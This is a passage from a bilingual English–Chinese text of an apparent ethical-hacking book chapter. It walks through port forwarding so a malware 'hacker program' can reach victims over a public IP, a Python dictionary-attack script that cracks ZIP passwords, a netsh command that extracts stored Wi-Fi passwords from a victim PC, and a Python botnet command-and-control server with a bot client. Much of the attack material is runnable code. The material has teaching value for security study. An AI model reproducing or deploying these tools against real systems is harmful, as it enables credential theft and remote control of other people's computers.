  zh: 到目前为止，我们所有的攻击都发生在本地网络中。这要求你作为黑客和受害者必须连接到同一个网络。然而，在许多攻击场景中，情况并非如此。这时，公共IP地址就显得非常重要了。在讨论网络基础时，我们已经了解了公共和私有IP地址。为了执行成功的攻击，我们需要知道黑客的公共IP。在黑客机器上，你可以通过访问[google.com](http://google.com)，输入**my
    public ip**，这样会显示你的公共IP地址，前提是你没有使用任何VPN或网络遮掩工具。它将是一个类似的32位地址，由你的ISP提供。我的公共IP是**31.38.10.X**，最后8位由于隐私问题被屏蔽。你的IP地址会根据你所处的位置不同而有所不同。找到它应该不会很难。一旦你得到了公共IP地址，去受害者程序中，输入黑客的公共IP，而不是黑客的私有IP。
- en: The first part of our puzzle is done. The next part is for packets to successfully
    reach the hacker machine. The hacker must be able to receive packets on the specified
    port. To do this, the hacker must enable *port forwarding* in their router settings.
    Port forwarding is disabled by default in most router settings for security purposes.
    However, if you know the password for the router panel, you can do this. In order
    to access these settings, find your Wi-Fi router and most likely there will be
    a sticker on the back of the router with the router's server address. It will
    be like **192.168.1.1** or something like that. Note that this will depend on
    your specific router and I can't provide it to you. There will also be a password
    and username written on the router. Go to your router settings page.
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的谜题的第一部分完成了。接下来的部分是确保数据包能够成功到达黑客机器。黑客必须能够在指定的端口接收数据包。为此，黑客必须在其路由器设置中启用*端口转发*。大多数路由器的端口转发默认是关闭的，以确保安全。然而，如果你知道路由器面板的密码，你就可以进行设置。为了访问这些设置，找到你的Wi-Fi路由器，背面通常会有一张贴纸，上面写有路由器的服务器地址。它可能是**192.168.1.1**或者类似的地址。请注意，这取决于你使用的具体路由器，我无法为你提供确切的地址。路由器上还会写有用户名和密码。进入你的路由器设置页面。
- en: Once you are on your router settings, find the **Port forwarding** settings.
    These will depend on your router. There you will see an option for which port
    you want to forward the packets to. Enter the port number that you are using for
    your hacker program and save the settings. Now you are done, and you can carry
    out attacks over a public IP as well. This will help you attack victims that are
    not located in your local network.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦进入你的路由器设置，找到**端口转发**设置。这些设置会根据你的路由器有所不同。在这里，你将看到一个选项，可以选择将数据包转发到哪个端口。输入你为黑客程序使用的端口号并保存设置。现在，你已经完成了设置，能够通过公共IP进行攻击了。这将帮助你攻击不在本地网络中的受害者。
- en: Cracking passwords
  id: totrans-117
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 破解密码
- en: In this section, we will learn how to crack password-protected files using a
    password database. We will try to crack a ZIP file in this section. A ZIP file
    is a binary format that stores files in compressed format and can be password
    protected. We will carry out a dictionary attack. Let's first learn what a dictionary
    attack is!
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将学习如何使用密码数据库破解受密码保护的文件。我们将在本节中尝试破解一个ZIP文件。ZIP文件是一种二进制格式，用于存储以压缩格式保存的文件，并且可以设置密码保护。我们将进行字典攻击。首先让我们了解什么是字典攻击！
- en: A dictionary attack is an attack in which a hacker tries to guess the victim's
    password by using a set of predefined passwords. They usually have a very large
    database of passwords stored in a file and try to use one of the passwords to
    see if the victim's password matches the password list. This password list is
    usually obtained from a leak of passwords from a compromised website and other
    forums. This is why you should never reuse a password for one website more than
    once. If you use the same password for a website and the website gets compromised,
    chances are that all your passwords could be compromised.
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 字典攻击是一种攻击方式，黑客通过使用一组预定义的密码来猜测受害者的密码。他们通常有一个包含大量密码的数据库文件，并尝试使用这些密码中的一个来看受害者的密码是否与列表中的密码匹配。这个密码列表通常来自于被泄露的密码，这些密码来源于被攻破的网站和其他论坛。因此，你绝不应该为多个网站重复使用相同的密码。如果你在一个网站使用了相同的密码，而该网站被攻破，那么你的所有密码很可能都会被泄露。
- en: 'You can find a list of the most widely used passwords here: [https://github.com/danielmiessler/SecLists.](https://github.com/danielmiessler/SecLists'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以在这里找到最常用的密码列表：[https://github.com/danielmiessler/SecLists.](https://github.com/danielmiessler/SecLists)
- en: )
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: )
- en: This list contains around 10 million passwords and is updated regularly. If
    a user uses a password that is stored in this file, you can easily crack it.
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 该列表包含约1000万个密码，并且会定期更新。如果用户使用的密码存储在这个文件中，你就可以轻松破解它。
- en: I have downloaded a file from the previously mentioned GitHub repo. Let's take
    a look at its contents.
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 我从前面提到的GitHub仓库下载了一个文件。让我们来看看它的内容。
- en: 'Create a new project and store this password file from the repo in the project.
    Also, copy the password-protected ZIP file to the project. I have created a dummy
    file called **secret file.txt**, which is password-protected in ZIP format. The
    password is **qwerty**, which is located in the password database file as well.
    The password file looks like this:'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 创建一个新项目，并将仓库中的密码文件存储在该项目中。同时，将密码保护的ZIP文件复制到该项目中。我创建了一个名为**secret file.txt**的虚拟文件，它是ZIP格式的并且受密码保护。密码是**qwerty**，该密码也位于密码数据库文件中。密码文件内容如下：
- en: '![Figure 8.18 – Password database file'
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.18 – 密码数据库文件'
- en: '](image/B14788_08_18.jpg)'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_18.jpg)'
- en: Figure 8.18 – Password database file
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.18 – 密码数据库文件
- en: 'To crack the file, we will need the **zipfile** Python library, which is a
    part of the Python standard package, so we don''t need to install it. Import this
    into your script using the following:'
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 要破解这个文件，我们需要使用**zipfile** Python库，它是Python标准库的一部分，因此无需安装。可以通过以下方式将其导入到你的脚本中：
- en: import zipfile
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: import zipfile
- en: encrypted_filename= "secret file.zip"
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: encrypted_filename= "secret file.zip"
- en: zFile = zipfile.ZipFile(encrypted_filename)
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: zFile = zipfile.ZipFile(encrypted_filename)
- en: 'We will create a ZIP file object and pass the encrypted filename to it. Next,
    we need to open the password database file as well, in read mode so that we can
    match the passwords:'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将创建一个ZIP文件对象，并将加密后的文件名传递给它。接下来，我们还需要以读取模式打开密码数据库文件，以便可以匹配密码：
- en: passFile = open("passwords.txt", "r")
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: passFile = open("passwords.txt", "r")
- en: 'for line in passFile.readlines():'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 'for line in passFile.readlines():'
- en: test_password = line.strip("\n").encode('utf-8')
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: test_password = line.strip("\n").encode('utf-8')
- en: 'try:'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 'try:'
- en: print(test_password)
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: print(test_password)
- en: zFile.extractall(pwd=test_password)
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: zFile.extractall(pwd=test_password)
- en: print("Match found")
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: print("找到匹配项")
- en: break
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: break
- en: 'except Exception as err:'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 'except Exception as err:'
- en: pass
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: pass
- en: 'In the previous code, we read the passwords one by one and tested them. Note
    that in order to test a password, it should be in binary form instead of string
    format. If the password doesn''t match, we simply raise an exception and move
    to the next password. If it matches, we print the **Match found** statement and
    break the loop and if we look at the directory you will see that a new folder
    will be created, which will contain an unencrypted file:'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的代码中，我们逐一读取密码并进行测试。请注意，为了测试一个密码，它应该是二进制格式，而不是字符串格式。如果密码不匹配，我们只需引发异常并继续测试下一个密码。如果匹配，我们会打印出**找到匹配项**的语句，并跳出循环。如果你查看目录，你会看到一个新文件夹被创建，这个文件夹包含未加密的文件：
- en: '![Figure 8.19 – Password cracking'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.19 – 密码破解'
- en: '](image/B14788_08_19.jpg)'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_19.jpg)'
- en: Figure 8.19 – Password cracking
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.19 – 密码破解
- en: Here we are testing various passwords and when the password matches, we extract
    the file and break the loop, as you can clearly see that the password is **qwerty**.
    In this section, we have learned how to crack password-protected files. In the
    next section, we will learn how to create botnets and how they can be useful to
    us.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，我们正在测试各种密码，当密码匹配时，我们提取文件并打破循环，正如你可以清楚地看到密码是**qwerty**。在本节中，我们学会了如何破解密码保护的文件。在接下来的章节中，我们将学习如何创建僵尸网络，以及它们如何对我们有用。
- en: Stealing passwords
  id: totrans-148
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 偷取密码
- en: In this section, we will see how we can steal Wi-Fi passwords stored on the
    victim PC. Note that we have already discussed how to execute commands on a Windows
    machine using our hacker program. We can take advantage of this program to retrieve
    Wi-Fi passwords. Note that you may not have a Wi-Fi driver installed on your virtual
    OS. I have this driver installed. If you want, you can use your host PC for this
    purpose.
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将学习如何窃取存储在受害者计算机上的Wi-Fi密码。请注意，我们已经讨论过如何使用我们的黑客程序在Windows机器上执行命令。我们可以利用这个程序来获取Wi-Fi密码。需要注意的是，你的虚拟操作系统可能没有安装Wi-Fi驱动程序。我已经安装了该驱动程序。如果你愿意，你可以使用你的主机计算机来完成此任务。
- en: 'In order to access the stored access points on the victim machine, you need
    to run the following command:'
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 为了访问受害者计算机上存储的接入点，你需要运行以下命令：
- en: netsh wlan show profiles
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: netsh wlan show profiles
- en: 'If you run this command in your Command Prompt, you will see all the access
    points you have connected with your PC. But we want to access the passwords, not
    the access points. Here is the screenshot for my PC:'
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你在命令提示符中运行此命令，你将看到所有与你的计算机连接过的接入点。但我们想要访问的是密码，而不是接入点。以下是我计算机的截图：
- en: '![Figure 8.20 – Connected access points'
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 8.20 – 已连接的接入点'
- en: '](image/B14788_08_20.jpg)'
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_20.jpg)'
- en: Figure 8.20 – Connected access points
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.20 – 已连接的接入点
- en: 'In order to get the passwords, you have to write the name of the access point
    and give an additional parameter, **key=clear**, to the command. The complete
    command will look like this:'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 为了获取密码，你需要写出接入点的名称，并为命令提供额外的参数，**key=clear**。完整的命令如下所示：
- en: netsh wlan show profiles "POCO X3 NFC" key=clear
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: netsh wlan show profiles "POCO X3 NFC" key=clear
- en: 'You will see a similar output:'
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 你将看到类似的输出：
- en: '![Figure 8.21 – Retrieving passwords'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 8.21 – 获取密码'
- en: '](image/B14788_08_21.jpg)'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_21.jpg)'
- en: Figure 8.21 – Retrieving passwords
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.21 – 获取密码
- en: The last field in **Security settings** is the password for this access point
    in plain text. You can run these commands with your malware program as well if
    you have a Wi-Fi driver installed on your virtual OS (Windows).
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: '**安全设置**中的最后一个字段是此接入点的明文密码。如果你的虚拟操作系统（Windows）上安装了Wi-Fi驱动程序，你也可以使用恶意软件程序来运行这些命令。'
- en: Creating botnets
  id: totrans-163
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 创建僵尸网络
- en: In [*Chapter 7*](B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152), *Advanced
    Malware*, we developed a malware program that can contain one hacker and one victim
    program. This is useful when you want to carry out an attack on one specific target.
    However, in a lot of cases, you would want to have one *command and control center*
    for the hacker and a lot of victim programs running on different machines and
    communicating with one hacker program, with the hacker being able to control these
    devices remotely. These are what we call **botnets**. Botnets are small programs
    that run on different machines and communicate with one command-and-control center.
    They are used for a lot of malicious purposes, such as **Distributed Denial of
    Service** (**DDoS**) attacks, where you make a certain website go offline by generating
    millions of requests at a time or use the resources of computers to mine cryptocurrency,
    and so on.
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 在[*第7章*](B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152)中，*高级恶意软件*，我们开发了一个包含黑客程序和受害者程序的恶意软件程序。当你想要对特定目标进行攻击时，这非常有用。然而，在很多情况下，你可能需要为黑客程序提供一个*指挥和控制中心*，并让多个受害者程序在不同的计算机上运行并与黑客程序通信，而黑客能够远程控制这些设备。这些就是我们所说的**僵尸网络**。僵尸网络是运行在不同机器上的小程序，它们与一个指挥控制中心通信。它们被用于许多恶意目的，例如**分布式拒绝服务**（**DDoS**）攻击，通过在同一时间生成数百万次请求来使某个网站宕机，或者利用计算机的资源进行加密货币挖掘，等等。
- en: 'Let''s start creating our own botnet and then create different bots to communicate
    with the command-and-control center. We will write two programs: one will be called
    **CnC.py** for the command-and-control center. This will serve the same purpose
    as a hacker program. The other will be called **bot1.py**. You can create any
    number of bots that you want, however, for illustration purposes, I will create
    only one bot.'
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们开始创建自己的僵尸网络，并创建不同的bot与指挥控制中心进行通信。我们将编写两个程序：一个名为**CnC.py**，用作指挥控制中心。它的功能与黑客程序类似。另一个程序将命名为**bot1.py**。你可以创建任意数量的bot，不过为了演示，我将只创建一个bot。
- en: Create a new project called **bots** and create a new Python file called **CnC.py**.
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 创建一个名为**bots**的新项目，并创建一个名为**CnC.py**的新Python文件。
- en: This should be created on a Kali machine.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 这应该在Kali机器上创建。
- en: 'We will need the same **socket** library we used before. Let''s start with
    our imports:'
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将需要之前使用过的**socket**库。让我们从导入开始：
- en: import socket
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: import socket
- en: from threading import Thread
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: from threading import Thread
- en: import time
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: import time
- en: Since we want to create a number of bots, we are using threads for each different
    bot. Threads are used to create a separate thread that runs concurrently.
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们希望创建多个bot，我们为每个bot使用线程。线程用于创建一个并行运行的单独任务。
- en: 'Next, we will create a list of threads and clients. The client will be bots
    in our case:'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将创建一个线程和客户端的列表。客户端在我们这个例子中将是bot：
- en: threads = []
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: threads = []
- en: clients = []
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: clients = []
- en: 'Next, we will create a function called **listen_for_bots()**, which, as the
    name indicates, will listen for incoming bot connections:'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将创建一个名为**listen_for_bots()**的函数，顾名思义，它将监听传入的bot连接：
- en: 'def listen_for_bots(port):'
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 'def listen_for_bots(port):'
- en: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- en: sock.bind(("", port))
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: sock.bind(("", port))
- en: sock.listen()
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: sock.listen()
- en: bot, bot_address = sock.accept()
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: bot, bot_address = sock.accept()
- en: clients.append(bot)
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: clients.append(bot)
- en: This is quite similar to what we did earlier while writing the hacker program.
    The only difference is that once the client is connected, we add it to the **client**
    list so that we can use this connection for various purposes as we did with the
    hacker program.
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 这和我们之前编写黑客程序时的操作非常相似。唯一的区别是，一旦客户端连接，我们会将其添加到**client**列表中，这样我们就可以像在黑客程序中一样利用这个连接做各种事情。
- en: 'Now we define a **main()** function where all our logic will reside:'
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们定义一个**main()**函数，所有的逻辑将在这里处理：
- en: 'def main():'
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 'def main():'
- en: print("[+] Server bot waiting for incoming connections")
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: print("[+] 服务器bot等待传入连接")
- en: startig_port = 8085
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: startig_port = 8085
- en: bots = 3
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: bots = 3
- en: 'We define the port that we want to use. Note that this is a **starting_port**
    and we will use different ports for different clients. We will simply add 1 to
    this number for each new client. The variable **bots=3** suggests that we want
    to connect only three bots, however, you can add as many clients as you want:'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: 我们定义了要使用的端口。请注意，这是一个**starting_port**，我们将为不同的客户端使用不同的端口。我们会简单地在每个新客户端上加1。变量**bots=3**表明我们只想连接三个bot，不过你可以根据需要添加任意数量的客户端：
- en: 'for i in range(bots):'
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 'for i in range(bots):'
- en: t = Thread(target=listen_for_bots, args=(i + startig_port,), daemon=True)
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: t = Thread(target=listen_for_bots, args=(i + startig_port,), daemon=True)
- en: threads.append(t)
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: threads.append(t)
- en: t.start()
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: t.start()
- en: Next, we will run these threads in a loop. **Daemon=True** means that we want
    to run these as a background process. Then we append each thread to a list so
    that we can access the thread.
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将在线程中运行这些任务。**Daemon=True**意味着我们希望将这些任务作为后台进程运行。然后，我们将每个线程添加到列表中，以便可以访问这些线程。
- en: 'Next, we will run a loop for the command-and-control center. While the clients
    are connected, we will display the clients and ask the hacker to select the client
    they want to interact with. Next, we run an internal loop for each bot, which
    will help us send messages to each bot individually by accessing the element in
    the list. Here you can define your own logic for a bot. You can send commands
    over to the bot and run those commands on the PC that the bot is running on. The
    rest is left up to you to define the functionality as you want. Here we are simply
    sending a message. Once you have achieved your objective, you can remove the client
    from the list:'
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将为指挥控制中心运行一个循环。当客户端连接时，我们会显示所有客户端，并让黑客选择他们想要交互的客户端。然后，我们会为每个bot运行一个内部循环，通过访问列表中的元素来帮助我们向每个bot单独发送消息。在这里，你可以为bot定义自己的逻辑。你可以向bot发送命令并在bot所在的PC上执行这些命令。其余的功能可以由你根据需求自行定义。这里我们只是发送了一条消息。一旦达成目标，你可以将该客户端从列表中移除：
- en: run_cnc = True
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: run_cnc = True
- en: 'while run_cnc:'
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: 'while run_cnc:'
- en: 'if len(clients) != 0:'
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 'if len(clients) != 0:'
- en: 'for i, c in enumerate(clients):'
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 'for i, c in enumerate(clients):'
- en: print("\t\t", i, "\t", c.getpeername())
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: print("\t\t", i, "\t", c.getpeername())
- en: 'selected_client = int(input("[+] Select client by index: "))'
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: selected_client = int(input("[+] 通过索引选择客户端："))
- en: bot = clients[selected_client]
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: bot = clients[selected_client]
- en: run_bot = True
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: run_bot = True
- en: 'while run_bot:'
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 'while run_bot:'
- en: 'msg = input("[+] Enter Msg: ")'
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: msg = input("[+] 输入消息：")
- en: msg = msg.encode()
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: msg = msg.encode()
- en: bot.send(msg)
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: bot.send(msg)
- en: 'if msg.decode() == "exit":'
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 'if msg.decode() == "exit":'
- en: run_bot = False
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: run_bot = False
- en: status = bot.recv(1024)
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: status = bot.recv(1024)
- en: 'if status == "disconnected".encode():'
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 'if status == "disconnected".encode():'
- en: bot.close()
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: bot.close()
- en: clients.remove(bot)
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: clients.remove(bot)
- en: print("data sent")
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: print("数据已发送")
- en: 'else:'
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 'else:'
- en: print("[+] No clients connected")
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: print("[+] 没有客户端连接")
- en: ans = input("[+] Do you want to exit? press [y/n]  ")
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: ans = input("[+] 你想退出吗？按[y/n] ")
- en: 'if ans == "y":'
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: 'if ans == "y":'
- en: run_cnc = False
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: run_cnc = False
- en: 'else:'
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 'else:'
- en: run_cnc = True
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: run_cnc = True
- en: 'Now we have defined a basic structure for the command-and-control center. The
    complete code for the bot can be found at the following link:'
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经为命令与控制中心定义了一个基本结构。完整的机器人代码可以在以下链接找到：
- en: '[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example13-CNC/CnC.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example13-CNC/CnC.py)'
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: '[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example13-CNC/CnC.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example13-CNC/CnC.py)'
- en: Next, we will define the logic for our bot.
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将定义我们的机器人逻辑。
- en: 'Go to the victim computer and create a new file called **bot1.py**. We will
    create a socket object and try to communicate with the hacker using the hacker''s
    IP. This step is similar to the malware program we developed earlier:'
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: 进入受害者计算机并创建一个名为**bot1.py**的新文件。我们将创建一个套接字对象，并尝试使用黑客的IP与黑客进行通信。这个步骤类似于我们之前开发的恶意软件程序：
- en: import socket
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: import socket
- en: 'if __name__ == "__main__":'
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: 'if __name__ == "__main__":'
- en: print("[+] Connecting with server")
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: print("[+] 正在连接服务器")
- en: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  id: totrans-229
  prefs: []
  type: TYPE_NORMAL
  zh: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- en: s.connect(("192.168.0.11", 8085))
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: s.connect(("192.168.0.11", 8085))
- en: 'Next, we will create a loop for **run_bot** and try to receive messages that
    the CNC is sending and once the message is received, you can define your own logic
    here. Here we will simply print the message, but you can add functionality to
    your liking. Once the CNC sends an exit message, we can simply disconnect the
    client bot from the server. The code is listed as follows:'
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将为**run_bot**创建一个循环，尝试接收CNC发送的消息。一旦消息接收，我们可以在这里定义自己的逻辑。这里我们仅打印消息，但你可以根据需要添加功能。一旦CNC发送退出消息，我们可以简单地将客户端机器人从服务器中断开。代码如下：
- en: run_bot = True
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: run_bot = True
- en: 'while run_bot:'
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 'while run_bot:'
- en: communicate_bot = True
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: communicate_bot = True
- en: 'while  communicate_bot:'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 'while communicate_bot:'
- en: msg = s.recv(1024)
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: msg = s.recv(1024)
- en: msg = msg.decode()
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: msg = msg.decode()
- en: 'print("command center said: ", msg)'
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: print("指令中心说：", msg)
- en: 'if msg == "exit":'
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 'if msg == "exit":'
- en: communicate_bot = False
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: communicate_bot = False
- en: '# ans = input("[+] do you want to remain connected: ")'
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: '# ans = input("[+] 是否希望保持连接：")'
- en: ans = "connected"
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: ans = "connected"
- en: 'if ans == "no":'
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: 'if ans == "no":'
- en: status = "disconnected"
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: status = "disconnected"
- en: s.send(status.encode())
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: s.send(status.encode())
- en: run_bot = False
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: run_bot = False
- en: 'else:'
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: 'else:'
- en: status = "conntected".encode()
  id: totrans-248
  prefs: []
  type: TYPE_NORMAL
  zh: status = "conntected".encode()
- en: s.send(status)
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: s.send(status)
- en: s.close()
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: s.close()
- en: 'The complete code for **bot1.py** is given at the following link:'
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 完整的**bot1.py**代码请参见以下链接：
- en: https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example13-CNC/bot1.py
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example13-CNC/bot1.py
- en: In this section, we have learned how to create a command-and-control center
    for bot net clients. You can add any number of clients you want and control them
    all together with your CNC program.
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们学习了如何为机器人网络客户端创建一个命令与控制中心。你可以添加任意数量的客户端，并使用你的CNC程序统一控制它们。
- en: Summary
  id: totrans-254
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we learned about some methods for how to successfully deploy
    your malware programs. An important aspect of a malware program is how stealthy
    it is. This chapter focused on hiding your malware inside images. We learned about
    malware attacks over a public IP and how a hacker can attack victims that are
    not present in the same network as the victim. We then learned how to crack a
    password-protected file using a dictionary attack. Lastly, we learned how to create
    a command-and-control center for botnet-based attacks. These attacks allow the
    hacker to control a large number of distributed devices with only one program.
    After going through this chapter, you should be able to create trojans, perform
    attacks over a public IP, and create your own botnets. In the next chapter, we
    will learn how you can protect your online identity as a hacker and how important
    this aspect is to a successful attack. See you in the next chapter!
  id: totrans-255
